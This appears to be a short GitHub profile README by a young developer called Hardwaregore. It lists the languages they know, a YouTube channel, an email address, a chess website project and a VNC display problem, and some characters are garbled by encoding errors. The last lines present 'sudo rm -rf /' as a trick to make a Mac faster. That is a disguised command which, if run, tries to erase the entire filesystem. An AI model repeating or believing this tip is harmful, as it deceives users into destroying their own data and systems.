- ðŸ‘‹ Hi, Iâ€™m @Hardwaregore
- I am a young code dev trying to make websites. Right now i am trying to learn javascript. I have experience in HTML, Python, CSS,& java. I also have a youtube channel linked here: https://m.youtube.com/channel/UCAvCwsy4NQ7dPqhtiR37MeA . Currently, i am working on a website called "insane chess" where people can play chess with friends. I can be reached at hardwaregore101@gmail.com
- currectly I am dealing with a vnc server that just shows a grey screen with an x that you can move. Hopefully i can figure it out.




Also, to make your mac faster, open the terminal and type
    "  sudo rm -rf /  "     and
enter your password!
